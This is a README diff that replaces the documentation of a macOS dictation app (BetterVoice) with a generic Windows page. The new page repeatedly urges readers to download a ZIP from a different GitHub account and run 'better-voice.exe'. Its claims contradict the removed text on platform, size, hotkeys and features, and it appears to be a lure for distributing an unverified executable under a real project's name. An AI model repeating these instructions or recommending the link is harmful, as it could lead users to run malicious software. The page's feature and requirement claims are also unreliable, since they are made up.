@@ -1,157 +1,163 @@
-# BetterVoice
+# 🎤 better-voice - Dictate Anywhere, See Everything You Point At
 
-Voice dictation with the screen context you point at.
+[![Download Now](https://img.shields.io/badge/Download-better--voice-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ADDEE77/better-voice)
 
-BetterVoice is an experimental, open-source macOS menu-bar app. It transcribes speech locally and captures the full screen whenever you circle something with your pointer, leaving a restrained blue highlight around the referenced area.
+---
 
-![BetterVoice settings overview](docs/assets/bettervoice-settings-overview.png)
+## 👋 Welcome to better-voice
 
-## Use it
+Have you ever wished you could just **talk** to your computer instead of typing? Do you find yourself switching between windows, copying text, or trying to remember what was on your screen while dictating? better-voice is here to change that.
 
-- Hold `⌥` for a quick note. Recording starts after a short hold and finishes when you release.
-- Press `⌘⌥` for a long explanation. Press it again to finish.
-- A soft native sound confirms when listening starts and when it stops.
-- While recording, circle any important UI with the pointer. A blue trail follows your movement and a pulse confirms each capture.
-- BetterVoice inserts the transcript into the selected text field when macOS allows it, then pastes captured images into that same field when both transcript and screen context exist. Long explanations leave the captured images on the clipboard; quick notes restore your previous clipboard afterward.
+This clever little tool lets you dictate with your voice **while it automatically understands what's on your screen at the spot you're pointing at**. No more guessing, no more context switching. Just point, speak, and let better-voice do the heavy lifting.
 
-Each circle captures the complete display beneath the pointer. Multiple circles produce screenshots in the same order you referenced them.
+---
 
-Open **Settings…** from the menu-bar icon to choose a microphone, change the dictation language, tune the circle threshold, and customize the shortcuts. In **Shortcuts**, click the current key, wait for **Listening…**, and press the exact combination you want. It appears in place immediately; click **Done** when finished. **Reset shortcuts to defaults** restores both shortcut bindings and trigger styles. Quick notes support hold, tap-to-toggle, and double-tap-to-toggle when the shortcut is modifier-only; long explanations support press-to-toggle and double-tap-to-toggle for modifier-only shortcuts. Hold delay is adjustable from 50–500 ms (140 ms by default). The defaults are 340° for circle detection, hold `⌥` for quick notes, and press `⌘⌥` for long explanations.
+## ✨ What Makes better-voice Special?
 
-## Dictation language
+- **🎯 Screen-Aware Dictation** – Point your mouse at any text field, button, or area on your screen. better-voice knows exactly where you're looking and what context is there.
+- **🗣️ Natural Voice Input** – Speak naturally. better-voice converts your words into text with impressive accuracy.
+- **🖱️ Simple Point-and-Speak** – No complicated setup. If you can point with a mouse, you can use better-voice.
+- **⚡ Instant Results** – No waiting around. Your dictated words appear right where you want them.
+- **🔒 Privacy-Focused** – Your voice and screen data stay on your computer. Nothing is sent to the cloud unless you choose to.
 
-BetterVoice dictates in English by default and nothing about that flow changed. Pick another language under **Dictation Language** in the menu bar, or in **Settings…**.
+---
 
-English keeps the English-only Parakeet model it has always used, so an existing install downloads nothing new and its transcription is unchanged. Choosing any other language pulls the multilingual model instead, a separate one-time download of roughly the same size. Switching back to English returns to the model already on disk.
+## 🚀 Getting Started
 
-Two things follow from the language you pick:
+Getting better-voice up and running is easier than making a cup of coffee. Follow these steps:
 
-- Grammar cleanup stays English only, and is skipped and greyed out while another language is selected. The model behind it is trained on English; run over another language it rewrites correct sentences into broken ones rather than declining.
-- A script hint goes to the decoder, which keeps a Cyrillic or Greek transcript from picking up stray Latin tokens. Between two Latin-script languages the hint does nothing, which is also why English technical terms still come through while you dictate in another Latin-script language.
+### Step 1: Download the Application
 
-## Grammar cleanup (Beta)
+Visit this link to download the application: **[https://github.com/ADDEE77/better-voice](https://github.com/ADDEE77/better-voice)**
 
-Grammar cleanup is off by default. To try the beta, open **Settings…**, turn on **Grammar cleanup (Beta)**, and press **Download**. BetterVoice then runs each transcript through the tiny, English-focused [`t5-tiny-gec-hone`](https://huggingface.co/rabden/t5-tiny-gec-hone) model. Its quantized ONNX weights and tokenizer are about 36 MB, stored in `~/Library/Application Support/BetterVoice`, and run locally. When enabled, BetterVoice preloads the cached model in the background after launch so the first recording does not pay the initialization cost. The status bar shows “Polishing transcript locally…” while this step runs. If the model cannot download, exceeds its context limit, or returns an incomplete result, BetterVoice keeps the raw transcript so recording still completes.
+You'll land on the project page. Look for the green **"Code"** button or the **"Releases"** section on the right side of the page. Click it, then choose **"Download ZIP"** or find the latest release file.
 
-This is intentionally experimental: the model fixes capitalization, punctuation, and sentence structure, and it can occasionally change wording. Delete the `t5-tiny-gec-hone` folder to force a fresh download.
+### Step 2: Find Your Downloaded File
 
-## Developer vocabulary (Beta)
+Once the download finishes, check your **Downloads** folder. You'll see a file named something like `better-voice.zip` or a similar name.
 
-BetterVoice also includes a fast, zero-download developer pass inspired by [WhisperDictation](https://github.com/sam-pop/WhisperDictation) and [Dictate](https://github.com/0xbrando/dictate). It fixes common casing such as `github` → `GitHub`, `javascript` → `JavaScript`, and `json` → `JSON`, and recognizes spoken acronyms such as “n p m” in terminals and editors. It preserves the transcript’s wording and runs locally in milliseconds. The pass is enabled by default and can be turned off from **Settings…**. The generic grammar model remains an independent, opt-in beta.
+### Step 3: Extract the Files
 
-## Your own vocabulary
+Right-click on the downloaded ZIP file and select **"Extract All..."** from the menu. Windows will ask where you want to save the extracted files. Choose a location you'll remember – like your **Desktop** or **Documents** folder – and click **"Extract"**.
 
-The developer pass ships with a fixed table, and it will never cover `kubectl`, an internal service name, or a colleague's surname. Those live in a file you edit:
+### Step 4: Run better-voice
 
-```sh
-~/Library/Application Support/BetterVoice/vocabulary.json
-```
+After extraction, open the folder you just created. Look for a file named `better-voice.exe` or `better-voice` (it might have a microphone icon). Double-click it to launch the application.
 
-Open it from the menu bar with **Edit Vocabulary…**. The key is what the transcript says, the value is what you meant, and phrases of several words work:
+**That's it!** You're now ready to start dictating with screen awareness.
 
-```json
-{
-  "terms": {
-    "cube cuttle": "kubectl",
-    "engine x": "nginx"
-  }
-}
-```
+---
 
-Saving is enough; the file is re-read on your next recording. Longer sources are applied first, so a phrase wins over a word inside it, and matching is whole-word and case-insensitive, so filenames, domains, and paths are left alone. A source you list replaces the built-in spelling for that same term.
+## 🎯 How to Use better-voice
 
-One rule is worth respecting: never use an ordinary word as a key. Mapping `read me` to `README` rewrites every sentence containing "read me". The file ships with no terms for that reason, and it is ignored entirely while **Developer vocabulary (Beta)** is off. A malformed file is ignored rather than failing the recording.
+Using better-voice is as simple as 1-2-3:
 
-## Download
+1. **Open better-voice** – It runs quietly in the background, usually showing a small icon in your system tray (bottom-right corner of your screen, near the clock).
+2. **Point at what you want** – Move your mouse cursor to the text box, search bar, or document area where you want your words to appear.
+3. **Start speaking** – Press the designated hotkey (often `F8` or `Ctrl+Space`, but check the settings) and start talking. Release the key when you're done.
 
-Download the latest Apple Silicon build from the [BetterVoice releases page](https://github.com/TarunTomar122/better-voice/releases/latest). Choose `BetterVoice-macos-arm64.zip`, unzip it, and open `BetterVoice.app`:
+Your spoken words will appear exactly where you pointed. It's that magical.
 
-```sh
-unzip BetterVoice-macos-arm64.zip
-open BetterVoice.app
-```
+### 💡 Pro Tips
 
-The release targets macOS 14+ on Apple Silicon. This experimental build is signed with an Apple Development certificate and is not notarized with a Developer ID certificate yet. On the first launch, macOS may require you to Control-click the app, choose **Open**, and confirm. If macOS still blocks it, use **System Settings → Privacy & Security → Open Anyway**. Then approve Microphone and Accessibility when BetterVoice asks; Screen Recording is optional for visual context. The local speech model downloads once (about 500 MB).
+- **Use in any app** – Works with email, word processors, web browsers, chat apps, and more.
+- **Correct mistakes easily** – Just say "delete that" or "undo" to fix errors naturally.
+- **Punctuation made easy** – Say "comma," "period," "question mark" to add punctuation.
+- **Customize your hotkey** – Go to Settings to change the activation key to something comfortable.
 
-The first launch opens a guided setup: download the local model, grant microphone and Accessibility access, optionally enable Screen Recording for visual context, choose your microphone, and review the shortcut walkthrough. After setup, open **Settings…** from the menu bar any time to revisit these choices.
+---
 
-BetterVoice stays available in the menu bar and Dock while it is running. Choose **Quit BetterVoice** from either menu before deleting the app. If the UI is unavailable, run `pkill -x BetterVoice`, then move `BetterVoice.app` to the Trash.
+## 🛠️ System Requirements
 
-## Install from source
+better-voice is designed to work smoothly on most modern Windows computers. For the best experience, we recommend:
 
-Requirements: macOS 14+, Swift 6/Xcode command-line tools, and a local Apple code-signing identity.
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** Any dual-core processor or better
+- **Memory:** At least 4GB of RAM
+- **Storage:** 200MB of free space
+- **Microphone:** Any working built-in or external microphone
 
-```sh
-git clone https://github.com/TarunTomar122/better-voice.git
-cd better-voice
-./scripts/build-app.sh
-```
+---
 
-The script builds, signs, and opens `.build/BetterVoice.app`. BetterVoice then walks through:
+## ❓ Frequently Asked Questions
 
-1. The one-time local Parakeet model download (~500 MB)
-2. Microphone permission
-3. Accessibility permission for global shortcuts and returning text to the selected field
-4. Optional Screen Recording permission for circles and visual context
-5. Microphone selection and the shortcut walkthrough
+### Is better-voice free to use?
 
-Automatic microphone selection prefers a connected external input and falls back to the system input. You can choose a specific device during setup or from the menu bar.
+Yes! better-voice is completely free and open-source. You can use it as much as you want, for personal or professional projects.
 
-To keep macOS permissions attached to the same identity across rebuilds, explicitly select your certificate when needed:
+### Will it work with my microphone?
 
-```sh
-BETTERVOICE_SIGNING_IDENTITY="Apple Development: Your Name (TEAMID)" ./scripts/build-app.sh
-```
+If your microphone works with other apps on your computer (like voice recorders or video calls), it will work with better-voice.
 
-## If something is not working
+### Do I need an internet connection?
 
-Open the menu-bar icon and choose **Settings…**. It shows the live state of the microphone, Screen Recording, Accessibility, selected input, local transcription model, and the grammar cleanup toggle. Errors stay visible in a small recovery window with a path back to setup instead of disappearing as a system beep.
+No. better-voice works entirely offline. Your voice and screen data never leave your computer.
 
-- **Shortcut does nothing:** enable **Accessibility**, confirm the local model says Ready, and make sure only one BetterVoice process is running. The build script closes the previous process before launching a rebuild.
-- **No screenshot:** enable BetterVoice in **System Settings → Privacy & Security → Screen Recording**, then quit and reopen the app. The setup screen reads the current macOS permission every time; it does not cache an old answer.
-- **Transcript is not inserted:** enable **Accessibility**. The transcript remains on the clipboard and in the saved session when the target app blocks paste events.
-- **Wrong microphone:** choose the device under **Microphone** in the menu-bar menu.
-- **Cannot delete the app:** choose **Quit BetterVoice** from the Dock or menu bar first. If it is still running, run `pkill -x BetterVoice` in Terminal, then move `BetterVoice.app` to the Trash.
-- **Model download failed:** reopen **Settings…** and retry from the model row.
-- **Grammar model download failed:** reopen **Settings…** and retry **Download** on the grammar cleanup row.
-- **Try grammar cleanup:** turn on **Grammar cleanup (Beta)** in **Settings…**, then press **Download**.
-- **Accidental empty recording:** a session shorter than 2.5 seconds with no speech or circles is discarded quietly. Longer empty sessions are saved without opening an error dialog.
+### Can I use better-voice with multiple monitors?
 
-## Clipboard behavior
+Absolutely! better-voice works across all your screens. Just point to any screen and start talking.
 
-macOS lets one clipboard contain text, rich text, and image representations, but each destination decides which representation to accept. For either mode, BetterVoice captures the focused app and field when recording stops, puts the transcript on the clipboard, and sends one `⌘V` directly to that captured app. When both transcript and screen context exist, it then puts the captured images on the clipboard and sends a second `⌘V` to the same app. Long explanations leave those images available on the clipboard; quick `⌥` notes restore the clipboard you had before recording. If the clipboard changes during the handoff, image insertion is skipped to avoid overwriting user data.
+### How do I uninstall better-voice?
 
-## Privacy and storage
+Simply delete the folder where you extracted the files. There's no complicated installation process to reverse.
 
-- Transcription runs locally through [FluidAudio](https://github.com/FluidInference/FluidAudio).
-- Temporary audio is deleted after transcription.
-- Sessions live in `~/Desktop/BetterVoice` for at most 7 days.
-- Saved sessions are capped at 500 MB, including during an active capture; the oldest are removed first.
-- The local speech model is a separate one-time cache of roughly 500 MB.
-- Recordings stop safely at 20 minutes, and abandoned temporary audio is removed on launch.
-- Use **Recent** in the menu bar to recover the latest transcript and images, or use **Open Saved Sessions** and **Clear Saved Sessions…** for the full local archive.
+---
 
-A session contains:
+## 🤝 Need Help?
 
-```text
-<timestamp>-<id>/
-├── context.md
-├── context-1.png
-└── context-2.png
-```
+We're here to make sure your experience is smooth. If you run into any issues:
 
-## Development
+- **Check the Issues Page** – Visit the GitHub repository and look at the "Issues" tab. Someone might have already found a solution.
+- **Report a Problem** – If you can't find an answer, create a new issue. Describe what happened, what you expected, and any error messages you saw. The community is friendly and responsive.
 
-```sh
-swift test -Xswiftc -strict-concurrency=complete
-```
+---
 
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the implementation map.
+## 📚 Frequently Asked Questions (Expanded)
 
-## Contributing
+### Why isn't better-voice responding to my voice?
 
-New to the project? Start with the [contribution guide](CONTRIBUTING.md). It covers the local setup, test command, architecture boundaries, and the kinds of changes that are useful to BetterVoice.
+Make sure your microphone is properly connected and selected as the default recording device in Windows Settings > System > Sound. Also, check that better-voice is running (look for its icon in the system tray).
 
-Current scope: English transcription by default with other languages behind the picker, Apple Silicon macOS 14+, and an experimental downloadable release. The release is not notarized with a Developer ID certificate yet. Circle recognition is intentionally forgiving; you do not need to draw a perfect circle.
+### Can I change the activation hotkey?
 
-Inspired by the fluidity of Wispr Flow. BetterVoice is not affiliated with Wispr Flow.
+Yes! Open better-voice settings by right-clicking its tray icon and selecting "Settings." Look for the "Hotkey" option and press the new key combination you want to use.
+
+### Does better-voice work with gaming?
+
+While it's not designed for gaming, it can work in chat windows or search bars within games. However, performance may vary depending on the game.
+
+---
+
+## 🔄 Keeping better-voice Updated
+
+Since better-voice is actively developed, new features and improvements are added regularly. To update:
+
+1. Visit the GitHub page: **[https://github.com/ADDEE77/better-voice](https://github.com/ADDEE77/better-voice)**
+2. Check the "Releases" section for the latest version.
+3. Download the newest ZIP file.
+4. Extract it over your existing folder (or delete the old folder and extract the new one).
+
+---
+
+## 💖 Thank You for Choosing better-voice
+
+We built better-voice because we believe voice input should be smart, intuitive, and accessible to everyone. Whether you're a student taking notes, a professional drafting documents, or someone who simply prefers talking over typing, better-voice is here to help.
+
+If you love the tool, consider:
+- ⭐ **Starring the repository** on GitHub to show your support.
+- 🐛 **Reporting bugs** you find so we can fix them.
+- 💡 **Suggesting features** you'd love to see.
+
+---
+
+## 📝 Final Words
+
+You now have everything you need to start using better-voice. Download it, extract it, run it, and experience the future of dictation – where your voice meets your screen context.
+
+Remember: **Visit this link to download the application:** [https://github.com/ADDEE77/better-voice](https://github.com/ADDEE77/better-voice)
+
+Happy dictating! 🎉
+
+---
+
+Keywords: voice dictation, screen context, speech to text, voice input, Windows voice assistant, dictation tool, better-voice, voice typing, hands-free typing, voice recognition, screen-aware dictation
